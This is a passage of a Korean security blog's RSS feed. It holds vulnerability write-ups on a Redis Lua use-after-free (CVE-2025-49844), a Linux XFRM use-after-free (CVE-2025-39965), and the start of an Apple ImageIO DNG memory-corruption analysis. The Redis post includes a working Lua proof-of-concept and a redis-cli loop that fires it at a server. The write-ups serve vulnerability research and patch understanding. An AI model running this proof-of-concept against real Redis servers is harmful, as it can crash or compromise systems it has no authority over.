GC&#xB294; &#xD574;&#xB2F9; &#xAC12;&#xC744; &#xD574;&#xC81C;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">...luaX_setinput(L, &amp;lexstate, z, luaS_new(L, name));...</code></pre><p>&#xBB38;&#xC81C;&#xB294; <code>luaY_parser()</code>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xAC01; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xCCAD;&#xD06C; &#xC774;&#xB984; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xACE0;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; <code>luaY_parser()</code> &#xB0B4;&#xC5D0;&#xC11C;&#xB294; &#xCCAD;&#xD06C; &#xC774;&#xB984;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC;, &#xBCC4;&#xB3C4;&#xC758; &#xCCAD;&#xD06C; &#xACE0;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB54C;&#xBB38;&#xC5D0;, &#xACE0;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD574;&#xB2F9; &#xCCAD;&#xD06C;&#xB97C; GC&#xB294; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xD574;&#xC81C; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; <code>luaY_parser()</code>&#xAC00; &#xB2E4;&#xC2DC; &#xCC38;&#xC870;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA74; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>luaY_parser</code>&#xAC00; &#xD30C;&#xC2F1;&#xC744; &#xC644;&#xB8CC;&#xD558;&#xAE30; &#xC804;&#xC5D0; GC&#xB97C; &#xB450; &#xBC88; &#xC5F0;&#xC18D;&#xC73C;&#xB85C; &#xAC15;&#xC81C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;, &#xD30C;&#xC11C;&#xAC00; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xB97C; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C; &#xC2DC;&#xCF1C; UAF&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- CVE-2025-49844 repro: leverage GC during parsing to revive freed chunk name.</span><span class="hljs-comment">-- Keep the chunk large enough to hold onto GC-managed memory but avoid the</span><span class="hljs-comment">-- &quot;200 local variables&quot; compilation guard by filling it with comments.</span><span class="hljs-keyword">local</span> payload = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;-- whatthefuuuuuuuuuuuuuuck\n&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build_payload</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> <span class="hljs-built_in">lines</span> = {}<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">150</span> <span class="hljs-keyword">do</span><span class="hljs-built_in">lines</span>[i] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&apos;local v_%d = %d&apos;</span>, i, i)<span class="hljs-keyword">end</span><span class="hljs-built_in">lines</span>[#<span class="hljs-built_in">lines</span> + <span class="hljs-number">1</span>] = <span class="hljs-string">&apos;return 0&apos;</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(<span class="hljs-built_in">lines</span>, <span class="hljs-string">&apos;\n&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_chunk_name</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> p = newproxy(<span class="hljs-literal">true</span>)<span class="hljs-built_in">getmetatable</span>(p).<span class="hljs-built_in">__gc</span> = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><span class="hljs-comment">-- Re-enter the collector while luaY_parser still holds the name string</span><span class="hljs-built_in">collectgarbage</span>(<span class="hljs-string">&apos;collect&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">tostring</span>(p)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> source = build_payload()<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">2000</span> <span class="hljs-keyword">do</span><span class="hljs-keyword">local</span> fn, err = <span class="hljs-built_in">loadstring</span>(source, make_chunk_name())<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fn <span class="hljs-keyword">then</span><span class="hljs-keyword">return</span> { step = i, err = err }<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> i % <span class="hljs-number">64</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">then</span><span class="hljs-comment">-- Heap churn to encourage the collector to run during parsing</span><span class="hljs-keyword">local</span> junk = {}<span class="hljs-keyword">for</span> j = <span class="hljs-number">1</span>, <span class="hljs-number">256</span> <span class="hljs-keyword">do</span>junk[j] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;A&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;completed w/o immediate crash (sybau &amp; re-run to increase likelihood)&quot;</span></code></pre><p>&#xD574;&#xB2F9; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; redis-cli&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; UAF&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-keyword">while</span> redis-cli -h localhost -p 6379 --<span class="hljs-built_in">eval</span> CVE-2025-49844.lua &gt;/dev/null; <span class="hljs-keyword">do</span>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;.&apos;</span><span class="hljs-keyword">done</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Redis 8.2.2 &#xBC84;&#xC804;&#xC5D0; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0DD;&#xC131;&#xB41C; &#xCCAD;&#xD06C;&#xB97C; <code>setsvalue2s()</code>, <code>incr_top()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC784;&#xC744; &#xC54C;&#xB9AC;&#xBA70; &#xACE0;&#xC815; &#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. GC&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xC784;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xAE30;&#xC5D0; UAF &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">TString *tname = luaS_new(L, name);setsvalue2s(L, L-&gt;top, tname);incr_top(L);luaX_setinput(L, &amp;lexstate, z, tname);<span class="hljs-comment">--L-&gt;top;</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49844">https://nvd.nist.gov/vuln/detail/CVE-2025-49844</a></li><li><a href="https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua">https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Redis/">Redis</category>
      
      <category domain="https://hackyboiz.github.io/tags/redis-server/">redis-server</category>
      
      <category domain="https://hackyboiz.github.io/tags/Use-After-Free/">Use After Free</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-39965: Linux Kernel XFRM subsystem의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/</link>
      <guid>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/</guid>
      <pubDate>Sun, 26 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://streypaws.github.io/posts/Dissecting-a-1-Day-Vuln</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://streypaws.github.io/posts/Dissecting-a-1-Day-Vulnerability-in-Linux-XFRM-Subsystem/">https://streypaws.github.io/posts/Dissecting-a-1-Day-Vulnerability-in-Linux-XFRM-Subsystem/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu: <a href="https://ubuntu.com/security/CVE-2025-39965">https://ubuntu.com/security/CVE-2025-39965</a></li><li>Red Hat: <a href="https://access.redhat.com/security/cve/cve-2025-39965">https://access.redhat.com/security/cve/cve-2025-39965</a></li><li>SUSE: <a href="https://www.suse.com/security/cve/CVE-2025-39965.html">https://www.suse.com/security/cve/CVE-2025-39965.html</a></li><li>Debian: <a href="https://security-tracker.debian.org/tracker/CVE-2025-39965">https://security-tracker.debian.org/tracker/CVE-2025-39965</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110;&#xC758; IPsec &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; XFRM &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; Use-After-Free &#xCDE8;&#xC57D;&#xC810; CVE-2025-39965&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD5C;&#xADFC; <a href="https://github.com/torvalds/linux/commit/94f39804d891cffe4ce17737d295f3b195bc7299">94f39804d891cffe4ce17737d295f3b195bc7299</a> &#xCEE4;&#xBC0B;&#xC5D0;&#xC11C; &#xBCC0;&#xACBD;&#xB41C; <code>net/xfrm/xfrm_state.c</code> &#xD30C;&#xC77C;&#xC758; <code>xfrm_alloc_spi</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xACF5;&#xAC04;&#xC73C;&#xB85C;&#xBD80;&#xD130; Netlink &#xBA54;&#xC2DC;&#xC9C0;&#xC778; <code>XFRM_MSG_ALLOCSPI</code>&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xBA70;, SPI&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">xfrm_alloc_spi</span><span class="hljs-params">(struct xfrm_state *x, u32 low, u32 high,</span></span><span class="hljs-function"><span class="hljs-params">   struct netlink_ext_ack *extack)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//... </span><span class="hljs-keyword">for</span> (h = <span class="hljs-number">0</span>; h &lt; range; h++) {    <span class="hljs-comment">// Return value of get_random_u32_inclusive can be 0.</span>    u32 spi = (low == high)? low : get_random_u32_inclusive(low, high);    newspi = htonl(spi);    spin_lock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);    x0 = xfrm_state_lookup_spi_proto(net, newspi, x-&gt;id.proto);    <span class="hljs-keyword">if</span> (!x0) {        x-&gt;id.spi = newspi;        h = xfrm_spi_hash(net, &amp;x-&gt;id.daddr, newspi,                    x-&gt;id.proto, x-&gt;props.family);                 <span class="hljs-comment">// New xfrm_state obj with spi=0</span>        hlist_add_head_rcu(&amp;x-&gt;byspi, net-&gt;xfrm.state_byspi + h);         err = <span class="hljs-number">0</span>;        spin_unlock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);        <span class="hljs-keyword">goto</span> unlock;    }<span class="hljs-comment">//...</span>}</code></pre><p>&#xD574;&#xB2F9; &#xCEE4;&#xBC0B;&#xC740; SPI &#xC911;&#xBCF5; &#xBC29;&#xC9C0;&#xB97C; &#xC704;&#xD574; &#xD560;&#xB2F9; &#xB85C;&#xC9C1;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC600;&#xB294;&#xB370;, &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>get_random_u32_inclusive</code> &#xD568;&#xC218;&#xAC00; 0&#xC744; &#xBC18;&#xD658;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC774;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; <code>xfrm_state</code> &#xAC1D;&#xCCB4;&#xAC00; <code>spi</code> &#xAC12;&#xC774; 0&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xACBD;&#xC6B0; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5B4; <code>byspi</code> &#xC804;&#xC5ED; &#xBAA9;&#xB85D;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __xfrm_state_delete(struct xfrm_state *x){    <span class="hljs-comment">//...</span>    <span class="hljs-comment">//If spi is 0, it&apos;s not removed from byspi list.</span>    <span class="hljs-keyword">if</span> (x-&gt;id.spi) {         hlist_del_rcu(&amp;x-&gt;byspi);    }    xfrm_state_free(x);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xADF8;&#xB7EC;&#xB098; XFRM &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; <code>SPI=0</code>&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; SPI &#xC5C6;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xB294; <code>__xfrm_state_delete</code> &#xD568;&#xC218;&#xB294; <code>spi</code> &#xAC12;&#xC774; 0&#xC774;&#xBA74; <code>byspi</code> &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xD574;&#xC81C;&#xB418;&#xC9C0;&#xB9CC;, <code>byspi</code> &#xBAA9;&#xB85D;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; dangling pointer&#xAC00; &#xB0A8;&#xC544; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">--- a/net/xfrm/xfrm_state.c+++ b/net/xfrm/xfrm_state.c<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">xfrm_alloc_spi</span><span class="hljs-params">(struct xfrm_state *x, u32 low, u32 high,</span></span><span class="hljs-function"><span class="hljs-params">   struct netlink_ext_ack *extack)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//... </span> <span class="hljs-keyword">for</span> (h = <span class="hljs-number">0</span>; h &lt; range; h++) { u32 spi = (low == high)? low : get_random_u32_inclusive(low, high);+<span class="hljs-keyword">if</span> (spi == <span class="hljs-number">0</span>)+<span class="hljs-keyword">goto</span> next; newspi = htonl(spi);<span class="hljs-comment">//...</span> xfrm_state_put(x0); spin_unlock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);+next: <span class="hljs-keyword">if</span> (signal_pending(current)) { err = -ERESTARTSYS; <span class="hljs-keyword">goto</span> unlock;</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xCEE4;&#xBC0B;(<a href="https://github.com/torvalds/linux/commit/cd8ae32e4e4652db55bce6b9c79267d8946765a9">cd8ae32e4e4652db55bce6b9c79267d8946765a9</a>)&#xC740; <code>xfrm_alloc_spi</code> &#xD568;&#xC218;&#xAC00; spi &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xAE30; &#xC804;, spi&#xAC12;&#xC774; 0&#xC774;&#xBA74; &#xD560;&#xB2F9;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/xfrm/">xfrm</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2025-39965/">cve-2025-39965</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ImageIO: iOS/macOS DNG Image Processing Memory Corruption (Ko)</title>
      <link>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/</link>
      <guid>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/</guid>
      <pubDate>Thu, 23 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/23/clalxk/imageIO_ko/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;~ MacOS &amp;#xC2DC;&amp;#xB9A</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/23/clalxk/imageIO_ko/image.png" alt="image.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;~ MacOS &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xB9C8;&#xCE58;&#xACE0; &#xC774;&#xBC88;&#xC5D4; ImageIO&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xB298;&#xC740; &#xC9C0;&#xB09C; 8&#xC6D4; 20&#xC77C;, iOS/MacOS/iPadOS &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; ImageIO &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xD2B9;&#xC815; &#xC778;&#xBB3C;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xB41C; &#xAC8C; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xD654;&#xC81C;&#xAC00; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>&#xC790;.. &#xADF8;&#xB7FC; &#xC2DC;&#xC791;&#xD574;&#xBCFC;&#xAE4C;&#xC694;.. !!!  </p><hr><h1 id="0-ImageIO"><a href="#0-ImageIO" class="headerlink" title="0. ImageIO"></a>0. <a href="https://developer.apple.com/documentation/imageio">ImageIO</a></h1><p>ImageIO&#xB294; Apple&#xC758; macOS, iOS, iPadOS &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>&#xC774;&#xBBF8;&#xC9C0; &#xCC98;&#xB9AC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;</strong>&#xB85C;, &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xBBF8;&#xC9C0; &#xD615;&#xC2DD;&#xC758; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC811;&#xADFC;, &#xC555;&#xCD95; &#xBC0F; &#xB514;&#xCF54;&#xB529;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. Apple&#xC758; Core Graphics &#xBC0F; Photos, Preview, Safari, Messages, AirDrop, Mail, iCloud&#xC640; &#xAC19;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xC571;&#xACFC; &#xAE30;&#xB2A5;&#xC758; &#xC774;&#xBBF8;&#xC9C0; &#xCC98;&#xB9AC; &#xBC31;&#xC5D4;&#xB4DC;&#xB85C; &#xD3ED;&#xB113;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-CVE-2025-43300"><a href="#1-CVE-2025-43300" class="headerlink" title="1. CVE-2025-43300"></a>1. CVE-2025-43300</h1><p><img src="/2025/10/23/clalxk/imageIO_ko/image1.png" alt="image.png"></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Apple ImageIO &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; RawCamera&#xC758; JPEG Lossless (<code>SOF3</code>) &#xB514;&#xCF54;&#xB354;(<code>CDNGLosslessJpegUnpacker</code>)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, DNG &#xD30C;&#xC77C;&#xC758; TIFF &#xD0DC;&#xADF8;(<code>SamplesPerPixel</code>)&#xC640; &#xB0B4;&#xBD80; JPEG &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; component &#xC218;&#xAC00; &#xBD88;&#xC77C;&#xCE58;&#xD560; &#xB54C; &#xC798;&#xBABB;&#xB41C; &#xB8E8;&#xD504; &#xC0C1;&#xD55C; &#xB54C;&#xBB38;&#xC5D0; &#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xB97C; &#xB118;&#xACA8; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 20&#xC77C;&#xC5D0; iOS 18.6.2 &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;(&#xD328;&#xCE58;) &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xBC84;&#xC804;: 18.6.1</li><li>&#xD328;&#xCE58; &#xB41C; &#xBC84;&#xC804;: 18.6.2</li></ul><p><img src="/2025/10/23/clalxk/imageIO_ko/image2.png" alt="image.png"></p><p>&#xC6B0;&#xC120; 18.6.2 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ipsw &#xBC84;&#xC804; &#xBCC4;&#xB85C; diff&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC62C;&#xB824;&#xC8FC;&#xB294; <a href="https://github.com/blacktop/ipsw-diffs/tree/main"><strong>ipsw-diffs</strong></a>&#xB97C; &#xD1B5;&#xD574; 18.6.1&#xACFC; 18.6.2&#xC758; diff &#xB0B4;&#xC6A9;&#xC744; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>RawCamera</strong></p><blockquote><p>/System/Library/CoreServices/RawCamera.bundle/RawCamera</p></blockquote><pre><code class="hljs bash">-1738.140.3.0.0-  __TEXT.__text: 0x1e2d70-  __TEXT.__auth_stubs: 0x1850+1738.140.3.0.11+  __TEXT.__text: 0x1e3470+  __TEXT.__auth_stubs: 0x1870   __TEXT.__objc_methlist: 0x16e4   __TEXT.__const: 0x15326-  __TEXT.__gcc_except_tab: 0x2d440+  __TEXT.__gcc_except_tab: 0x2d588   __TEXT.__oslogstring: 0xec0   __TEXT.__cstring: 0xee23   __TEXT.__dof_RawCamera: 0x8f7-  __TEXT.__unwind_info: 0xb1d0+  __TEXT.__unwind_info: 0xb1e8   __TEXT.__eh_frame: 0x278   __TEXT.__objc_classname: 0x4b9   __TEXT.__objc_methname: 0x3918   __TEXT.__objc_methtype: 0xdd3   __TEXT.__objc_stubs: 0x2da0-  __DATA_CONST.__got: 0x9b0+  __DATA_CONST.__got: 0x9c8   __DATA_CONST.__const: 0x2a18   __DATA_CONST.__objc_classlist: 0x1e0   __DATA_CONST.__objc_catlist: 0x20   __DATA_CONST.__objc_imageinfo: 0x8   __DATA_CONST.__objc_selrefs: 0xcf8   __DATA_CONST.__objc_superrefs: 0xf0-  __DATA_CONST.__objc_arraydata: 0x3948-  __AUTH_CONST.__auth_got: 0xc40+  __DATA_CONST.__objc_arraydata: 0x3950+  __AUTH_CONST.__auth_got: 0xc50   __AUTH_CONST.__const: 0x35978   __AUTH_CONST.__cfstring: 0x18080   __AUTH_CONST.__objc_const: 0x48b0-  __AUTH_CONST.__objc_arrayobj: 0x570-  __AUTH_CONST.__objc_intobj: 0x39f0+  __AUTH_CONST.__objc_arrayobj: 0x588+  __AUTH_CONST.__objc_intobj: 0x3a20   __AUTH_CONST.__objc_doubleobj: 0x480   __AUTH_CONST.__objc_dictobj: 0x4d58   __AUTH_CONST.__objc_floatobj: 0xc0   - /System/Library/Frameworks/UniformTypeIdentifiers.framework/UniformTypeIdentifiers   - /System/Library/PrivateFrameworks/AppleJPEG.framework/AppleJPEG   - /System/Library/PrivateFrameworks/AppleJPEGXL.framework/AppleJPEGXL+  - /System/Library/PrivateFrameworks/CMPhoto.framework/CMPhoto   - /System/Library/PrivateFrameworks/CoreAnalytics.framework/CoreAnalytics   - /System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset   - /usr/lib/libSystem.B.dylib   - /usr/lib/libobjc.A.dylib   - /usr/lib/libxml2.2.dylib   - /usr/lib/libz.1.dylib-  UUID: 1BE38EB6-51C0-3069-A50F-CA3B000E0847-  Functions: 6433-  Symbols:   781+  UUID: AF5B7B35-3549-329B-B706-F877FA8DF849+  Functions: 6435+  Symbols:   786   CStrings:  7487 Symbols:+ _CMPhotoDecompressionContainerCreateImageForIndex+ _CMPhotoDecompressionContainerGetImageCount+ _CMPhotoDecompressionSessionCreate+ _CMPhotoDecompressionSessionCreateContainer+ _CVPixelBufferGetDataSize+ _kCMPhotoContainerFormatString_JFIF+ _kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs+ 